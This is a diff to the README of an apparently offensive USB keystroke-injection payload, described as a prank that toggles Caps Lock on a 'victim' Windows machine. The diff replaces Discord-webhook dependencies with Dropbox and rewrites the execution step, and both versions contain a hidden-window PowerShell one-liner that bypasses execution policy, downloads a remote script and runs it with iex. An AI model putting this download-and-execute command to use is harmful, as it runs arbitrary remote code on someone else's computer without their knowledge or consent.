@@ -29,19 +29,17 @@ This payload is meant to prank your victim with TURNING on AND off CAPS LOCK
 
 ### Dependencies
 
-* Pastebin or other file sharing service, Discord webhook or other webhook service
+* Dropbox or other file sharing service
 * Windows 10,11
-* [Here](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks) is a tutorial on how to use Discord webhooks 
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ### Executing program
 
 * Plug in your device
-* Define the `DEFINE TARGET_URL example.com`
-* Device will download both files and place them in proper directories to then run the script
+* Device will download the file and place them in proper directories to then run the script
 ```
-powershell -w h -NoP -NonI -ep Bypass $pl = iwr TARGET_URL dl=1; iex $pl
+powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the intended file> dl=1; iex $pl
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
